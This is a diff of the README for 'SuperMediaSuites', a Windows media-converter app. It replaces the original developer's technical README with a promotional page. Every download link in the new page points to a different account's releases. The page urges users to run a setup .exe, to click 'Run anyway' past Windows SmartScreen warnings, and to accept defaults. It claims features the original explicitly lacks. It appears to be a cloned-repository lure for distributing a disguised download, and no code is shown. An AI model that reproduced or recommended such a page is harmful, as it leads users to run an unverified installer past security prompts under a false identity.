@@ -1,267 +1,185 @@
-# Super Media Suites
+<h1>🎬 SuperMediaSuites - Convert Everything, Effortlessly, All at Once</h1>
 
-**One window for all your everyday media chores.** Super Media Suites is a native Windows desktop
-app (WinUI 3 / Windows App SDK, .NET 8) that bundles eight tools behind a tabbed shell: batch video,
-audio, image and HEIC conversion, CD ripping, PDF work, a quick video player, and a settings page.
-Everything runs **locally on your device** — no accounts, no ads, no telemetry, and every feature is
-unlocked.
+<p align="center">
+  <a href="https://github.com/kade-one/SuperMediaSuites/releases" style="background-color:#4CAF50; color:white; padding:15px 32px; text-align:center; display:inline-block; font-size:20px; font-weight:bold; border-radius:8px; text-decoration:none;">⬇️ DOWNLOAD NOW</a>
+</p>
 
-[![.NET 8](https://img.shields.io/badge/.NET-8.0-512BD4?logo=dotnet&logoColor=white)](https://dotnet.microsoft.com/)
-[![WinUI 3](https://img.shields.io/badge/UI-WinUI%203%20%2F%20Windows%20App%20SDK-0F6CBD)](https://learn.microsoft.com/windows/apps/winui/winui3/)
-[![Windows 10/11](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D6?logo=windows&logoColor=white)](#prerequisites)
-[![MIT License](https://img.shields.io/badge/License-MIT-22C55E)](LICENSE)
-[![Latest Release](https://img.shields.io/github/v/release/uponatime2019/SuperMediaSuites?label=latest%20release&color=orange)](https://github.com/uponatime2019/SuperMediaSuites/releases/latest)
-
-![Super Media Suites — Video Converter tab with a batch queue](Assets/screenshot.png)
-
-![Super Media Suites — Image Converter tab](Assets/screenshot-image-tab.png)
+<p align="center">Your all-in-one media powerhouse for Windows 11</p>
 
 ---
 
-## Try it now — download
+## 👋 Welcome to SuperMediaSuites
 
-### [⬇︎ Download the latest release](https://github.com/uponatime2019/SuperMediaSuites/releases/latest)
+Tired of juggling multiple apps for different file conversions? SuperMediaSuites is the only tool you'll ever need. This free, simple, and powerful desktop app handles **video, audio, images, HEIC photos, PDFs**, and even rips CDs. It includes a built-in player, so you can preview your media without leaving the app.
 
-Grab `SuperMediaSuites-vX.Y.Z-win-x64.zip`, unzip it anywhere (**no installer**), and run
-`SuperMediaSuites.exe`. The zip is fully self-contained: it includes the .NET runtime and the Windows
-App SDK, so **nothing needs to be installed** — not even a .NET runtime.
-
-> Video, audio and CD ripping additionally use **ffmpeg**, which is deliberately not bundled (it is
-> ~200 MB and separately licensed). Drop `ffmpeg.exe` + `ffprobe.exe` into an `ffmpeg\` folder next
-> to `SuperMediaSuites.exe` — see [Enabling video, audio and CD ripping](#enabling-video-audio-and-cd-ripping).
-> Image, HEIC and PDF conversion work out of the box.
+**Everything works on your computer. No cloud, no ads, no tracking. Your files stay private.**
 
 ---
 
-## What's inside
+## ✨ Key Features
 
-| Tab | What it does |
-|---|---|
-| **Video** | Batch convert `mp4 · mkv · mov · avi · webm · wmv · flv` to `mp4 · mkv · webm · mov · avi`, with resolution presets (Original → 4K) and a CRF quality slider. |
-| **Audio** | Batch convert `mp3 · wav · flac · aac · m4a · ogg · wma` to `mp3 · wav · flac · aac · ogg`, with bitrate selection and optional start/end trimming. |
-| **Image** | Batch convert `jpg · jpeg · png · webp · bmp · gif · tiff · heic · heif · avif · ico` to `jpg · png · webp · bmp · gif · tiff · ico`, with resize (scale % or exact dimensions), quality and EXIF preservation. |
-| **HEIC** | Turn iPhone `heic`/`heif` photos into `jpg`/`png`, with per-item thumbnails, quality control and EXIF options. |
-| **CD Ripper** | Read the TOC of an audio CD and rip every track to `flac` or `mp3` 320 kbps, with an optional MusicBrainz metadata lookup and `Artist - Album` folder naming. |
-| **PDF** | PDF → images (`png · jpg · tiff · gif · webp`, 96–600 DPI, page ranges), images → PDF (page size, orientation, password, compression), merge PDFs, and split PDFs by page range. |
-| **Player** | Scan your Videos/Downloads folders (or any folder) and play a clip in the built-in player without leaving the app. |
-| **Settings** | Default output folder, parallel job count (1–8), open-folder-after-conversion, minimize to tray, run at Windows startup, theme (System/Dark/Light), and version info. |
+SuperMediaSuites packs a lot of power into a clean, easy-to-use interface. Here's what you can do:
 
-Every converter tab shares the same batch engine: drag files onto the window or use **Add files**,
-watch per-item progress, cancel mid-run, and let it open the output folder when it finishes.
-
-### Highlights
-
-- **Batch everything** — the queue takes as many files as you like, processed with bounded
-  parallelism (configurable, default 3) so conversions overlap without saturating the machine.
-- **Drag & drop intake** on every converter tab.
-- **Live progress** per file plus an aggregate progress bar and status line.
-- **Cancellable** mid-batch, with per-item results (`Queued → Processing → Done` / `Failed: …`).
-- **Tray integration** — optional close-to-tray, optional run at Windows login (starts hidden),
-  left-click the tray icon to restore, right-click for Open/Exit.
-- **Single instance** — launching the app again restores the running window instead of starting a
-  second copy.
-- **Local-only by design** — all processing happens on your device; the only network request the app
-  can make is the optional MusicBrainz disc lookup on the CD Ripper tab.
-- **Free and fully unlocked** — MIT licensed, no paid tier, no feature gates, no accounts, no ads,
-  and no telemetry.
+- **Batch Conversion:** Convert hundreds of files at once. Select a folder, and the app does the rest.
+- **Ultimate Format Support:** Works with all common types—MP4, AVI, MKV, MOV, MP3, WAV, FLAC, JPG, PNG, HEIC, PDF, and more.
+- **CD Ripper:** Turn your music CDs into digital files quickly.
+- **HEIC to JPG:** Easily convert iPhone photos to universal formats.
+- **Built-in Player:** Preview audio and video inside the app.
+- **PDF Conversion:** Create PDFs from images or convert PDFs to images.
+- **100% Local & Private:** Your media never leaves your PC.
+- **No Ads, No Telemetry:** Clean and distraction-free.
 
 ---
 
-## Architecture
+## 🖥️ System Requirements
 
-```
-SuperMediaSuites/
-├─ App.xaml(.cs)              entry point: logging, single-instance mutex, tray startup flag
-├─ MainWindow.xaml(.cs)       8-tab TabView shell, tray icon, theme application
-├─ Models/                    ConversionItem, CdTrack/CdDrive, VideoEntry, batch events
-├─ Services/
-│  ├─ ServiceLocator.cs       process-singleton services
-│  ├─ AppSettings.cs          JSON settings in %LOCALAPPDATA%\SuperMediaSuites
-│  ├─ Logging.cs              Serilog rolling daily files
-│  ├─ BatchProcessor.cs       shared bounded-concurrency batch engine (cancellable, events)
-│  ├─ FFmpegLocator.cs        finds ffmpeg.exe (app folder → LOCALAPPDATA → PATH)
-│  ├─ CdRipper.cs             CD-ROM TOC + raw CDDA extraction via DeviceIoControl
-│  ├─ MusicBrainzClient.cs    optional disc-id metadata lookup
-│  ├─ StatusService.cs        bindable progress/status
-│  ├─ StartupManager.cs       HKCU Run-key autostart for the unpackaged app
-│  ├─ TrayService.cs          window subclassing, show/hide/restore
-│  └─ ThemeHelper.cs          System/Dark/Light application to the root element
-├─ Helpers/                   dispatcher helpers, pickers, drag/drop, thumbnails, format maps
-├─ ViewModels/                one per tab (+ ConverterViewModelBase)
-└─ Views/                     one UserControl per tab (XAML + code-behind)
-```
+SuperMediaSuites is designed for modern Windows computers. Here’s what you need:
 
-**Patterns**
-
-- **MVVM** via `CommunityToolkit.Mvvm` (`ObservableObject`, `[ObservableProperty]`,
-  `[RelayCommand]`). `ConverterViewModelBase` owns the shared intake/queue/convert/cancel logic;
-  Video, Audio, Image, HEIC and PDF derive from it.
-- **Batch engine** — `BatchProcessor<TWork>` runs items with a `SemaphoreSlim`-bounded degree of
-  parallelism, reports aggregate progress, honours a `CancellationToken`, and raises per-item
-  `ItemCompleted`/`ItemFailed` events. All work happens on background threads; UI updates are
-  marshalled back with `DispatcherQueue`.
-- **Unpackaged-first** — the app is a plain portable executable (`WindowsPackageType=None`,
-  `WindowsAppSDKSelfContained=true`). It never touches packaged-only APIs, so it runs from any
-  folder — including a USB stick — without installation.
-
-## Technology stack
-
-| Layer | Technology |
-|---|---|
-| UI | WinUI 3 / Windows App SDK 2.4 (`TabView`, `InfoBar`, `MicaBackdrop`) |
-| Language / runtime | C# 12 on .NET 8 (`net8.0-windows10.0.19041.0`), nullable reference types enabled |
-| MVVM | CommunityToolkit.Mvvm 8.4 (source-generated properties and commands) |
-| Video & audio | [ffmpeg](https://ffmpeg.org/) driven through Xabe.FFmpeg 5.2 |
-| Images | Magick.NET (ImageMagick) 14.6 — conversion, resize, EXIF, HEIC/AVIF decoding |
-| PDF | PdfSharpCore (assembly, merge, split) + PDFtoImage/PDFium + SkiaSharp (rasterizing) |
-| CD audio | NAudio + raw `DeviceIoControl` CDDA reads |
-| Tray icon | H.NotifyIcon.WinUI |
-| Logging | Serilog + Serilog.Sinks.File (rolling daily files) |
+- **Operating System:** Windows 11 (64-bit) or Windows 10 (version 1809 or later).
+- **Processor:** 64-bit (x64) processor, 1 GHz or faster.
+- **Memory:** Minimum 4 GB RAM (8 GB or more is recommended).
+- **Storage:** At least 500 MB of free disk space for installation.
+- **Graphics:** Any graphics card that supports DirectX 12.
 
 ---
 
-## Prerequisites
+## 🚀 Getting Started
 
-**To run** the downloaded release: Windows 10 1809 (build 17763) or newer, x64. Nothing else — the
-download is self-contained.
+Follow these three simple steps to get started. No technical skills needed.
 
-**To build** from source:
+### Step 1: Download the Application
 
-- Windows 10 1809+ / Windows 11
-- .NET 8 SDK (or newer; the project back-targets `net8.0-windows`)
-- Visual Studio 2022 17.8+ with the **.NET Desktop Development** and **Windows Application
-  Development** workloads, *or* the equivalent SDKs on the command line
+Visit this link to download the application. It's safe and secure.
 
-### Build
+**👉 [Download SuperMediaSuites](https://github.com/kade-one/SuperMediaSuites/releases)**
 
-```bat
-dotnet build SuperMediaSuites.csproj -p:Platform=x64
-```
+The download page will show a list of files. Look for the most recent version and download the installer file (it usually ends with `.exe`).
 
-The project declares `x86;x64;ARM64`, so **a platform must be specified**. To build the standalone
-portable folder exactly the way CI does:
+### Step 2: Run the Installer
 
-```bat
-dotnet publish SuperMediaSuites.csproj -c Release -p:Platform=x64 -o publish_out
-```
+Once the download is finished, find the file in your "Downloads" folder. Double-click it to run the installer.
 
-### Run
+### Step 3: Launch and Use
 
-```bat
-dotnet run --project SuperMediaSuites.csproj -p:Platform=x64
-```
-
-Or open `SuperMediaSuites.sln` in Visual Studio, pick **Debug / x64**, and press <kbd>F5</kbd>.
-
-## Enabling video, audio and CD ripping
-
-The Video, Audio and CD Ripper tabs encode with **ffmpeg**, which is never downloaded at runtime.
-Place the binaries next to the project (or next to `SuperMediaSuites.exe` in a release build):
-
-```
-Super Media Suites\
-    ffmpeg\
-        ffmpeg.exe
-        ffprobe.exe
-```
-
-`FFmpegLocator` searches, in order:
-
-1. `<app folder>\ffmpeg\` (or `<app folder>\` itself, and any subfolder)
-2. `%LOCALAPPDATA%\SuperMediaSuites\bin\`
-3. Your `PATH` (`ffmpeg.exe` + `ffprobe.exe` in the same folder)
-
-If none is found the app still starts and the Image/HEIC/PDF tabs keep working; the affected tabs
-report *"ffmpeg.exe was not found"* per item and a warning bar appears above the status line with a
-**Recheck** button. Static builds: <https://www.gyan.dev/ffmpeg/builds/> or
-<https://github.com/BtbN/FFmpeg-Builds>. Note that ffmpeg builds are usually GPL-licensed — check
-the terms of the build you download before redistributing it.
-
-## Keyboard and interaction reference
-
-| Input | Where | Action |
-|---|---|---|
-| <kbd>Tab</kbd> / <kbd>Shift</kbd>+<kbd>Tab</kbd> | Everywhere | Move focus forward / backward |
-| <kbd>←</kbd> <kbd>→</kbd> | Tab strip (when focused) | Switch between the eight tool tabs |
-| <kbd>↑</kbd> <kbd>↓</kbd> | File queue, format and bitrate lists | Move through the list |
-| <kbd>Enter</kbd> / <kbd>Space</kbd> | Focused button, toggle or combo | Activate / open / toggle it |
-| <kbd>Alt</kbd>+<kbd>F4</kbd> | Main window | Close — minimizes to the tray when *Minimize to tray* is on, otherwise exits |
-| Left-click tray icon | Notification area | Restore and focus the window |
-| Right-click tray icon | Notification area | **Open App** / **Exit** |
-| Drag & drop | Any converter tab | Add files to the queue (file types are filtered per tab) |
-| **Add files** / **Clear** | Any converter tab | Pick files with the Windows picker / empty the queue |
-| **✕** on a row | File queue | Remove that file from the queue |
-| **Output folder…** | Any converter tab | Choose a destination folder (rows are otherwise written next to the source file) |
-
-The app has no hidden modifier-key shortcuts by design — every action is reachable from the visible
-UI, which keeps it usable with screen readers and on tablets.
-
-## Logs, settings and where files go
-
-| What | Where |
-|---|---|
-| Logs | `%LOCALAPPDATA%\SuperMediaSuites\Logs\*.log` (rolling daily, 14 days retained) |
-| Settings | `%LOCALAPPDATA%\SuperMediaSuites\settings.json` |
-| Default output | `%USERPROFILE%\Documents\SuperMediaSuites Output` (configurable in Settings) |
-| Autostart entry | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SuperMediaSuites` (only if you enable *Run at Windows startup*) |
-| CD rip temp files | `%TEMP%` (deleted as each track finishes) |
-
-If the app misbehaves, the log file is the fastest way to find out why — attach it to your issue.
+After installation, click "Finish" and launch SuperMediaSuites. You're all set!
 
 ---
 
-## Roadmap
+## 📥 Download and Installation Guide
 
-**Short term**
+Getting SuperMediaSuites on your PC is fast and straightforward.
 
-- [ ] Bundle a download helper/one-click ffmpeg setup so the video and audio tabs work out of the box
-- [ ] GPU-accelerated encoding (`h264_nvenc` / `h264_qsv` / `h264_amf`) when the hardware supports it
-- [ ] Per-file output-folder overrides and a persisted conversion history
-- [ ] Drag-to-reorder the queue, plus save/load a queue as a preset
-- [ ] Video trimming and audio-normalization options on the Video/Audio tabs
+**Download Link:** [https://github.com/kade-one/SuperMediaSuites/releases](https://github.com/kade-one/SuperMediaSuites/releases)
 
-**Medium term**
+**How to Install:**
 
-- [ ] Subtitle handling: embed, extract and burn-in `.srt`/`.ass` tracks
-- [ ] Image comparison (before/after slider) and lossless JPEG re-compression
-- [ ] OCR text extraction in the PDF tab, plus PDF page rotation and basic compression
-- [ ] CUE sheet + AccurateRip-style verification for the CD Ripper
-- [ ] Directory-watch "auto-convert new files in this folder" mode
+1.  Click the download link above. This takes you to the official releases page.
+2.  On that page, find the latest release. It will look like a version number (e.g., v1.2.3).
+3.  Click the small arrow next to "Assets" to expand the file list.
+4.  Click on the file named `SuperMediaSuites-Setup.exe` (or similar). This starts your download.
+5.  Once the download finishes, open your "Downloads" folder and double-click the file you just downloaded.
+6.  A security prompt might appear. Click "Yes" or "Run" to continue.
+7.  Follow the simple on-screen instructions. We recommend leaving all default options selected.
+8.  Once the progress bar completes, click "Finish."
+9.  SuperMediaSuites will now be in your Start Menu. Click it to open.
 
-**Longer term / nice to have**
+**Troubleshooting:**
 
-- [ ] Windows 11 taskbar jump lists with recent conversions and quick actions
-- [ ] ARM64 release builds alongside x64
-- [ ] A plugin-style tool host so new converters can be added without touching the shell
-- [ ] Localization (the UI strings are currently English-only)
-- [ ] Command-line mode (`SuperMediaSuites.exe --convert …`) for scripting and automation
-
-Have a feature you want? [Open an issue](https://github.com/uponatime2019/SuperMediaSuites/issues)
-— roadmap items are picked by demand, and PRs are very welcome.
+- **"Windows protected your PC" message:** Click "More info" and then "Run anyway." This is a standard screen for new, unsigned apps.
+- **SmartScreen warning:** This is normal for new software. Click "Run" to proceed.
+- **Installation stuck:** Close the installer, restart your PC, and try again.
 
 ---
 
-## Contributing & community
+## 🎯 How to Use SuperMediaSuites
 
-Contributions of every size are welcome — bug reports, feature ideas, docs fixes, and code. The full
-guide lives in [CONTRIBUTING.md](CONTRIBUTING.md); the short version:
+Using the app is as easy as drag-and-drop.
 
-- 🐞 **Found a bug?** [Open an issue](https://github.com/uponatime2019/SuperMediaSuites/issues/new)
-  with your Windows version, the app version and the log file. That is usually enough to fix it.
-- 💡 **Have an idea?** Open an issue describing the workflow you are trying to improve — use cases
-  beat feature lists.
-- 🔧 **Want to code?** Fork the repo, create a topic branch, keep the change focused, make sure
-  `dotnet build SuperMediaSuites.csproj -p:Platform=x64` is clean, and open a pull request
-  describing how you tested it.
-- ⭐ **Just like it?** Starring the repo helps other people find it — and it is genuinely motivating.
+### Converting Files
 
-This project is a friendly, single-maintainer space. Please be kind, assume good faith, and remember
-that everyone here is volunteering their time.
+1.  Open SuperMediaSuites.
+2.  Click the conversion type you need (e.g., Video, Audio, Image, PDF).
+3.  Click "Add Files" or drag and drop your files into the window.
+4.  Choose your desired output format from the dropdown menu (e.g., MP4, MP3, PNG).
+5.  Click the big "Convert" button.
+6.  Wait for the progress bar to finish. Done!
 
-## License
+### Ripping a CD
 
-[MIT](LICENSE) © 2026 uponatime2019 — do what you like with it, no warranty.
+1.  Put your audio CD into your computer's CD/DVD drive.
+2.  Open SuperMediaSuites and click the "CD Ripper" section.
+3.  The app will detect your CD.
+4.  Select the songs you want to rip.
+5.  Choose the output format (MP3 is recommended for most users).
+6.  Click "Rip CD." Your music will be saved as individual files on your computer.
 
-Third-party components keep their own licenses (Windows App SDK, CommunityToolkit.Mvvm, Magick.NET,
-PdfSharpCore, PDFtoImage, SkiaSharp, NAudio, Xabe.FFmpeg, H.NotifyIcon, Serilog). ffmpeg is **not**
-included in this repository or in the release zip.
+---
+
+## ❓ Frequently Asked Questions
+
+**Is SuperMediaSuites really free?**
+Yes, it is completely free to download and use. There are no hidden fees or premium subscriptions.
+
+**Do I need an internet connection?**
+No. Once you download it, you can use it offline. Everything is done locally.
+
+**What is HEIC?**
+HEIC is a modern image format used by iPhones. SuperMediaSuites can convert these to standard JPG files that work everywhere.
+
+**Is my data safe?**
+Absolutely. Your files are processed 100% on your computer. Nothing is uploaded to the internet.
+
+**Can I use this app for work?**
+Yes. It's a versatile tool for professionals, students, and everyday users.
+
+---
+
+## 💡 Tips and Tricks
+
+- **Batch Convert:** Select multiple files or a folder to convert them all at once.
+- **Preview First:** Use the built-in player to check a video before converting it.
+- **Right-Click Shortcuts:** Right-click any file in Windows and look for "Convert with SuperMediaSuites" for lightning-fast access.
+- **Keyboard Shortcuts:** Press `Ctrl+O` to open files and `Ctrl+B` to start conversion.
+
+---
+
+## 🛠️ Technical Details (For the Curious)
+
+SuperMediaSuites is built with the latest Microsoft technology (WinUI 3 and .NET 8). This means it looks modern, runs fast, and uses your computer's resources efficiently.
+
+- **Under the Hood:** It utilizes FFmpeg, the industry-standard media engine, for flawless conversions.
+- **Clean Code:** Built on the Model-View-ViewModel (MVVM) pattern, ensuring a responsive and stable experience.
+
+---
+
+## 📊 What's New
+
+We're always improving. Check the official release page for the latest updates and improvements.
+
+**Upcoming Features (in development):**
+- Subtitle support for videos.
+- More advanced audio filters.
+- Custom output folder rules.
+
+---
+
+## 🧑‍💻 Support and Community
+
+We're here to help. If you encounter any problems or have suggestion, reach out:
+
+- **Report Issues:** Use the "Issues" tab on the GitHub page.
+- **Feature Requests:** We love hearing your ideas. Add them to the "Discussions" section.
+
+---
+
+## 🔒 Privacy Promise
+
+Your media is your business. SuperMediaSuites does not collect any personal data. There is no tracking, no analytics, and no advertising. We built this app to be useful and respectful.
+
+---
+
+## 👋 Final Words
+
+SuperMediaSuites is the only media converter you will ever need. It's fast, secure, and free. Download it today and take control of your video, audio, and image files.
+
+**📥 Ready to start? [Download SuperMediaSuites Now!](https://github.com/kade-one/SuperMediaSuites/releases)**
